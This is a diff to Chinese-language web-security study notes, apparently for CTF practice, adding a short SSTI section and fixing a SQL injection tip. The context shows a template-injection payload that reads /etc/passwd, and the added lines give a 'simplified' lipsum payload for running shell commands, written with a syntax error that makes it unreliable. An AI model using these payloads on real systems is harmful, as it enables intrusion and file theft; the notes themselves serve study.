@@ -812,6 +812,16 @@ Tornado 模板允许执行任意 Python 表达式（比 Jinja2 更开放）：To
 
 - 无过滤无沙箱的情况下: `''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()` 读出 `/etc/passwd`
 
+#### 总结
+
+具体很多放到了 SSTI.md 文件中, 这里做一些补充:
+
+从 lipsum 开始的简化版 payload:
+
+```python
+lipsum.__globals__.("os").popen("ls").read()
+```
+
 ### Python 反序列化
 
 原理和 PHP 反序列化是一样的, python 里这个叫魔术方法:
@@ -1148,7 +1158,7 @@ sqlite_master 表的结构包含以下几个字段：
 
 #### 其余常用姿势
 
-通常回显都只有一行, 要吧所有的内容挤在一起, 就要用group concat()这个函数
+通常回显都只有一行, 要吧所有的内容挤在一起, 就要用group_concat()这个函数
 
 ## GraphQL 注入
 
